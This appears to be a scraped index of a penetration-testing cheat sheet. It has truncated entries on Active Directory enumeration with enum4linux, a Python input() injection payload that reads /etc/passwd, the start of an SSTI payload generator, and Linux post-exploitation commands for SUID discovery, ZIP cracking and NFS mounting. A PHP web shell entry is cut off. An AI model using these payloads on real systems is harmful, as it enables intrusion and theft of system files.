item.title: Active Directory
item.description: enum4linux> enum4linux # > enum4linux [options] ip Usage: /usr/bin/enum4linux [options] ip Options are (like "enum"): -U get userlist -M get machine list* -S get sharelist -P get password policy information -G get group and member list -d be detailed, applies to -U and -S -u user specify username to use (default "") -p pass specify password to use (default "") The following options from enum.

item.title: Python
item.description: Take Advantage Of input() Function And Run System Commands Within It __import__('os').system('cat /etc/passwd') Easy SSTI Payloads Generator GitHub Source #!/usr/bin/python3 from cmd import Cmd import urllib.parse, argparse parser = argparse.ArgumentParser(description="Generate SSTI payloads.

item.title: Linux
item.description: View Cron Jobs> View Cron Jobs # crontab -l List Scheduled Processes/Tasks/Scripts> List Scheduled Processes/Tasks/Scripts # systemctl list-timers View NFS (Network File Share)> View NFS (Network File Share) # showmount REMOTE_IP -e Mount NFS> Mount NFS # mount -t nfs REMOTE_IP:/PATH/TO/NFS/SHARE /LOCAL/PATH/TO/MOUNT Crack ZIP Files> Crack ZIP Files # fcrackzip -u -D -p /PATH/TO/WORDLIST ZIP_FILE Find SUID Binaries> Find SUID Binaries # find / -type f -perm -4000 2>/dev/null PHP WebShell> PHP WebShell # <?
